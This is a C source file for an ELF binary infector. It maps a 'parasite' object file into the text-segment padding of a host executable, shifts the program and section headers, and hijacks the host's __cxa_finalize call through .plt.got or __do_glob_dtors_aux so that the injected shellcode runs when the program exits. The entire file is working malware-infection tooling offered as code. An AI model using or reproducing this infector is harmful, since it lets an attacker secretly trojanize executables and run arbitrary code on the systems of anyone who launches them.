#include <infect_cxa_finalize.h>

long PAGE_SIZE = 0;
uint8_t options = 0;

#define RET         0xc3
#define PUSH_RDI    0x57

const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d };
const uint8_t qwordcall[] = { 0xff, 0x15 };

#define PROLOGUE_LEN        1
#define EPILOGUE_LEN        7
#define EPILOGUE_JMPOFFT    1

#define PLTOGOT_WRAP_LEN    (PROLOGUE_LEN + EPILOGUE_LEN)
#define DTORS_WRAP_LEN      (PROLOGUE_LEN + EPILOGUE_LEN + 1)

uint8_t epilogue[EPILOGUE_LEN] = {
  0x5f,                                         // pop rdi
  0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
};

uint8_t jmp[5] = {
    0xe9, 0x00, 0x00, 0x00, 0x00, // jmp ?
};

uint32_t *jmp_operand = (uint32_t *)&jmp[1];

uint8_t call[6] = {
    0xe8, 0x00, 0x00, 0x00, 0x00, // call ?
    0x90                          // nop
};

uint32_t *call_operand = (uint32_t *)&call[1];

// If file_len contains a non-zero value, the file will be
// truncated to its current length + value in file_len.
static void *map_file(const char *path, size_t *file_len)
{
    if (!path || !file_len) {
        ERR("map_file: invalid argument\n");
        return NULL;
    }

    int fd;
    struct stat f_stat;
    void *mem;
    size_t length;

    memset(&f_stat, 0, sizeof(struct stat));

    if ((fd = open(path, O_RDWR)) == -1) {
        ERR("open: %s\n", strerror(errno));
        return NULL;
    }

    if (fstat(fd, &f_stat) == -1) {
        ERR("fstat: %s\n", strerror(errno));
        return NULL;
    }

    length = f_stat.st_size;

    if (*file_len) {
        size_t tmp = length + *file_len;
        if (tmp < length) {
            ERR("map_file: truncate length is too big\n");
            return NULL;
        }
        length = tmp;

        if (ftruncate(fd, length) == -1) {
            ERR("ftruncate: %s\n", strerror(errno));
            return NULL;
        }
    }

    mem = mmap(NULL, length,
                     PROT_READ | PROT_WRITE,
                     MAP_SHARED,
                     fd, 0);

    if (mem == MAP_FAILED) {
        ERR("mmap: %s\n", strerror(errno));
        return NULL;
    }

    *file_len = f_stat.st_size;

    close(fd);

    return mem;
}

static int map_parasite(const char *path, struct parasite_data *parasite)
{
    if (!parasite) {
        ERR("map_host: invalid argument\n");
        return -1;
    }

    size_t length = 0;

    parasite->bytes = (uint8_t *) map_file(path, &length);

    if (!parasite->bytes) {
        ERR("map_file: could not map the file\n");
        return -1;
    }

    parasite->size = length;

    parasite->shdrs = (Elf64_Shdr *)(parasite->bytes + parasite->elf->e_shoff);
    DBG("[DEBUG] Parasite Section Hdrs\t@%p\n", parasite->shdrs);

    return 0;
}

static int map_host(const char *path, struct parasite_host *host)
{
    if (!host) {
        ERR("map_host: invalid argument\n");
        return -1;
    }

    size_t length = PAGE_SIZE;

    host->bytes = (uint8_t *) map_file(path, &length);

    if (!host->bytes) {
        ERR("map_file: could not map the file\n");
        return -1;
    }

    host->size = length;

    host->phdrs = (Elf64_Phdr *)(host->bytes + host->elf->e_phoff);
    DBG("[DEBUG] Program Hdrs\t\t@%p\n", host->phdrs);
    host->shdrs = (Elf64_Shdr *)(host->bytes + host->elf->e_shoff);
    DBG("[DEBUG] Section Hdrs\t\t@%p\n", host->shdrs);

    host->scratch_space = mmap(NULL, host->size,
                          PROT_WRITE | PROT_READ,
                          MAP_ANONYMOUS | MAP_PRIVATE,
                          -1, 0);

    if (host->scratch_space == MAP_FAILED) {
        ERR("mmap: %s\n", strerror(errno));
        munmap(host->bytes, host->size+PAGE_SIZE);
        return -1;
    }

    return 0;
}

static void unmap_parasite(struct parasite_data *parasite)
{
    if (parasite) {
        if (parasite->bytes)
            munmap(parasite->bytes, parasite->size);
    }
}

static void unmap_host(struct parasite_host *host)
{
    if (host) {
        if (host->bytes)
            munmap(host->bytes, host->size+PAGE_SIZE);

        if (host->scratch_space)
            munmap(host->scratch_space, host->size);
    }
}

static int get_parasite_text(struct parasite_data *parasite)
{
    if (!parasite || !parasite->elf) {
        ERR("get_parasite_text: Invalid argument\n");
        return -1;
    }

    Elf64_Half i;
    char *section_strtab;

    Elf64_Shdr *sh_strtab = &parasite->shdrs[parasite->elf->e_shstrndx];
    section_strtab = (char *)((uint64_t)parasite->elf +
                              (uint64_t)sh_strtab->sh_offset);

    for (i = 0; i < parasite->elf->e_shnum; i++) {
        if ((parasite->shdrs[i].sh_type == SHT_PROGBITS) &&
            (!memcmp(section_strtab+parasite->shdrs[i].sh_name,".text", 6))) {
            parasite->text_bytes = (uint8_t *)((uint64_t)parasite->elf +
                                               (uint64_t)parasite->shdrs[i].sh_offset);
            parasite->text_size = parasite->shdrs[i].sh_size;
        }
    }

    if (!parasite->text_bytes || !parasite->text_size) {
        ERR("get_parasite_text: Parasite missing .text section\n");
        return -1;
    }

    DBG("[DEBUG] Parasite .text\t\t@%p\n", parasite->text_bytes);
    DBG("[DEBUG] Parasite size\t\t%lu\n", parasite->text_size);
    return 0;
}

static int get_host_sections(struct parasite_host *host)
{
    if (!host || !host->elf) {
        ERR("get_host_sections: Invalid argument\n");
        return -1;
    }

    Elf64_Half i;
    char *section_strtab;
    uint32_t *fini_array;

    Elf64_Shdr *sh_strtab = &host->shdrs[host->elf->e_shstrndx];
    section_strtab = (char *)((uint64_t)host->elf+ (uint64_t)sh_strtab->sh_offset);

    for (i = 0; i < host->elf->e_shnum; i++) {
        switch (host->shdrs[i].sh_type) {
        case SHT_DYNSYM:
        host->dyn_sym = (Elf64_Sym *)((uint64_t)host->elf +
                                      (uint64_t)host->shdrs[i].sh_offset);
        break;

        case SHT_FINI_ARRAY:
        fini_array = (uint32_t *)((uint64_t)host->elf +
                                  (uint64_t)host->shdrs[i].sh_offset);
        if (fini_array && fini_array[0]) {
            host->do_glob_dtors = (uint8_t *)((uint64_t)host->elf +
                                              (uint64_t)fini_array[0]);
        }
        break;

        case SHT_PROGBITS:
        if (!memcmp(section_strtab+host->shdrs[i].sh_name, ".plt.got", 9))
            host->plt_got = &host->shdrs[i];
        break;

        case SHT_RELA:
        if (!memcmp(section_strtab+host->shdrs[i].sh_name, ".rela.dyn", 10)) {
            host->rela_dyn = (Elf64_Rela *)((uint64_t)host->elf +
                                            (uint64_t)host->shdrs[i].sh_offset);
            host->no_rela_dyn = host->shdrs[i].sh_size/sizeof(Elf64_Rela);
        }
        break;

        case SHT_STRTAB:
        if (!memcmp(section_strtab+host->shdrs[i].sh_name, ".dynstr", 8))
            host->dyn_str = (char *)((uint64_t)host->elf +
                                     (uint64_t)host->shdrs[i].sh_offset);
        break;
        }
    }

    if (!host->dyn_sym || (!host->do_glob_dtors && !host->plt_got) ||
        !host->rela_dyn || !host->dyn_str) {
        ERR("get_host_sections: Candidate host missing a required section\n");
        return -1;
    }
    DBG("[DEBUG] .dyn.sym\t\t@%p\n", host->dyn_sym);
    DBG("[DEBUG] .rela.dyn\t\t@%p\n", host->rela_dyn);
    DBG("[DEBUG] No relocs\t\t%ld\n", host->no_rela_dyn);
    DBG("[DEBUG] .plt.got\t\t@%p\n", host->plt_got);
    DBG("[DEBUG] .dyn.str\t\t@%p\n", host->dyn_str);
    DBG("[DEBUG] do_glob_dtors\t\t@%p\n", host->do_glob_dtors);
    return 0;
}

static int find_cxafin_pltgot(struct parasite_host *host)
{
    uint64_t i;
    Elf64_Sym sym_it;
    uint8_t *cxafin_got = NULL,
            *plt_got = (uint8_t *)((uint64_t)host->elf +
                                             host->plt_got->sh_offset);
    uint32_t saved_offt;

    for (i=0; i < host->no_rela_dyn; i++) {
        sym_it = host->dyn_sym[ELF64_R_SYM(host->rela_dyn[i].r_info)];

        if (!memcmp(&host->dyn_str[sym_it.st_name], "__cxa_finalize", 15)) {
            cxafin_got = (uint8_t *)((uint64_t)host->elf +
                                                 host->rela_dyn[i].r_offset);
            break;
        }
    }

    if (!cxafin_got) return -1;

    DBG("[DEBUG] __cxa_finalize\t\t@%p\n", cxafin_got);

    for (i=0; i < host->plt_got->sh_size; i++) {
        if (plt_got[i] == 0xff && plt_got[i+1] == 0x25) {
            saved_offt = *(uint32_t *)&plt_got[i+2];
            if (cxafin_got == (&plt_got[i+6] + saved_offt)) {
                DBG("[DEBUG] code offset:\t\t0x%x\n", saved_offt);
                memcpy(&epilogue[EPILOGUE_JMPOFFT],
                       &plt_got[i], 6);
                host->hijack_site = &plt_got[i];
                return 0;
            }
        }
    }
    return -1;
}

static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
{
    uint64_t i,j;
    uint64_t bytes_to_eof;
    Elf64_Addr infect_vaddr = 0;
    uint8_t *infct_site;

    // total length of the parasite
    size_t shellcode_len = parasite->text_size;

    // length of the instruction we are overwriting
    uint32_t inst_len;


    if (HIJACK_PLT(options)) {
        if (!host->plt_got) {
            ERR("mamma_mia: Can't hijack __cxa_finalize in .plt.got: not found\n");
            return -1;
        }
        shellcode_len += PLTOGOT_WRAP_LEN;
        inst_len = 6;
    } else if (HIJACK_DTORS(options)) {
        if (!host->do_glob_dtors) {
            ERR("mamma_mia: Can't hijack __cxa_finalize in __do_glob_dtors_aux: not found\n");
            return -1;
        }
        shellcode_len += DTORS_WRAP_LEN;
        inst_len = 7;
    } else {
        ERR("mamma_mia: Invalid options\n");
        return -1;
    }

    for (i=0; i < host->elf->e_phnum; i++) {
        if (host->phdrs[i].p_type == PT_LOAD) {
            if (host->phdrs[i].p_flags & PF_X) {
                uint64_t total_segment_size = shellcode_len +
                                              (host->phdrs[i].p_memsz%PAGE_SIZE);

                if ((total_segment_size <  shellcode_len) ||
                    (total_segment_size > PAGE_SIZE)) {
                    ERR("mamma_mia: parasite is too large\n");
                    return -1;
                }

                DBG("[DEBUG] Total segment size:\t%lu\n", total_segment_size);

                infct_site = host->bytes +
                              host->phdrs[i].p_offset+host->phdrs[i].p_filesz;

                infect_vaddr = host->phdrs[i].p_vaddr +
                               host->phdrs[i].p_memsz;

                bytes_to_eof = (host->size -
                                host->phdrs[i].p_offset -
                                host->phdrs[i].p_filesz);

                host->phdrs[i].p_filesz += shellcode_len;
                host->phdrs[i].p_memsz += shellcode_len;
                for (j=i+1; j < host->elf->e_phnum; j++) {
                    if (host->phdrs[j].p_offset > host->phdrs[i].p_offset)
                        host->phdrs[j].p_offset += PAGE_SIZE;
                }
            }
        }
    }

    for (i=0; i < host->elf->e_shnum; i++) {
        if (host->shdrs[i].sh_offset > infect_vaddr) {
            host->shdrs[i].sh_offset += PAGE_SIZE;
        }

        if (infect_vaddr == (host->shdrs[i].sh_addr + host->shdrs[i].sh_size)) {
            host->shdrs[i].sh_size += shellcode_len;
        }
    }

    uint32_t *rel_cxa_finalize = (uint32_t *)&epilogue[EPILOGUE_JMPOFFT+2];
    *rel_cxa_finalize -= (((uint64_t)infct_site+shellcode_len-inst_len) -
                          (uint64_t)host->hijack_site);

    memcpy(host->scratch_space, infct_site, bytes_to_eof);
    *infct_site = PUSH_RDI;
    memcpy(infct_site+PROLOGUE_LEN, parasite->text_bytes, parasite->text_size);
    memcpy(infct_site+PROLOGUE_LEN+parasite->text_size, epilogue, EPILOGUE_LEN);
    if (HIJACK_DTORS(options))
        *(infct_site + PROLOGUE_LEN + parasite->text_size + EPILOGUE_LEN) = RET;
    memcpy(infct_site+PAGE_SIZE, host->scratch_space, bytes_to_eof);
    host->elf->e_shoff += PAGE_SIZE;

    uint32_t virus_offt = (uint32_t) ((uint64_t)infct_site -
                                     ((uint64_t)host->hijack_site+5));

    DBG("[DEBUG] hijack_site:\t\t%p\n", host->hijack_site);

    if (HIJACK_PLT(options)) {
        *jmp_operand = virus_offt;
        memcpy(host->hijack_site, jmp, 5);
    } else if (HIJACK_DTORS(options)) {
        *call_operand = virus_offt;
        memcpy(host->hijack_site, call, 6);
    }

    return 0;
}

static int find_cxafin_dtors(struct parasite_host *host)
{
    uint64_t i;
    uint32_t saved_offt;
    uint8_t *cxafin_got = NULL;


    /* this is a shitty but safer way to scan: a stray c3 in code will
     * ruin our search.
     * an alternative is to get some context, but you have to be careful
     * we can go past the ret if the termination is not reliable
     */
    for (i=0; host->do_glob_dtors[i+8] != RET; i++) {
        if (!memcmp(&host->do_glob_dtors[i], qwordcmp, 3)) {
            saved_offt = *(uint32_t *)&host->do_glob_dtors[i+3];
            cxafin_got = &host->do_glob_dtors[i+8] + saved_offt;
            DBG("[DEBUG][CMP] __cxa_finalize\t@%p\n", cxafin_got);
        }

        if (!memcmp(&host->do_glob_dtors[i], qwordcall, 2)) {
            saved_offt = *(uint32_t *)&host->do_glob_dtors[i+2];
            if (cxafin_got == &host->do_glob_dtors[i+6] + saved_offt) {
                DBG("[DEBUG] Found __cxa_finalize\t@%p\n", cxafin_got);
                memcpy(&epilogue[EPILOGUE_JMPOFFT],
                       &host->do_glob_dtors[i], 6);
                host->hijack_site = &host->do_glob_dtors[i];
                return 0;
            }
        }
    }
    return -1;
}

static void usage(const char *name) __attribute__((noreturn));

static void usage(const char *name)
{
    ERR("Usage: %s [-p] [-d] <parasite.o> <host.elf>\n\n", name);
    ERR("\t-p\tHijack __cxa_finalize in .plt.got\n");
    ERR("\t-d\tHijack __cxa_finalize in __do_glob_dtors_aux\n");
    exit(1);
}

int main(int argc, char **argv)
{
    int opt;

    while ((opt = getopt(argc, argv, "pd")) != -1) {
        switch (opt) {
        case 'p':
            options |= OPT_PLT;
            break;
        case 'd':
            options |= OPT_DTORS;
            break;
        default:
            usage(argv[0]);
            break;
        }
    }

    if  (optind > argc)
        usage(argv[0]);

    if (INVALID_OPTS(options))
        usage(argv[0]);

    struct parasite_host host;
    struct parasite_data parasite;

    PAGE_SIZE = sysconf(_SC_PAGESIZE);

    if (PAGE_SIZE == -1) {
        ERR("sysconf: %s\n", strerror(errno));
        return 2;
    };

    DBG("[DEBUG] Page size:\t\t%ld\n", PAGE_SIZE);

    memset(&host, 0, sizeof(struct parasite_host));
    memset(&parasite, 0, sizeof(struct parasite_data));

    if (map_host(argv[optind+1], &host) == -1) {
        ERR("map_host: failed to map the parasite host\n");
        return 3;
    }

    if (map_parasite(argv[optind], &parasite) == -1) {
        ERR("map_parasite: failed map the parasite\n");
        goto free_exit;
    }

    // marcello!
    if (get_host_sections(&host) == -1) {
        ERR("get_host_sections: failed to find required sections\n");
        goto free_exit;
    }

    // what is it?
    if (get_parasite_text(&parasite) == -1) {
        ERR("get_parasite_sections: failed to find required sections\n");
        goto free_exit;
    }

    // what you doin?
    if (HIJACK_PLT(options)) {
        if (!host.plt_got) {
            ERR("fatal: failed to find .plt.got section\n");
            goto free_exit;
        }

        if (find_cxafin_pltgot(&host) == -1) {
            ERR("find_cxafin_pltgot: failed to find __cxa_finalize()\n");
            goto free_exit;
        }
    } else if (HIJACK_DTORS(options)) {
        if (!host.do_glob_dtors) {
            ERR("fatal: failed to find __do_glob_dtors_aux function\n");
            goto free_exit;
        }
        if (find_cxafin_dtors(&host) == -1) {
            ERR("find_cxafin_dtors: failed to find __cxa_finalize()\n");
            goto free_exit;
        }
    }

    // infecting text padding!
    if (mamma_mia(&host, &parasite) == -1)
        ERR("mamma_mia: text padding method failed\n");

free_exit:
    unmap_host(&host);
    unmap_parasite(&parasite);
    return 0;
}
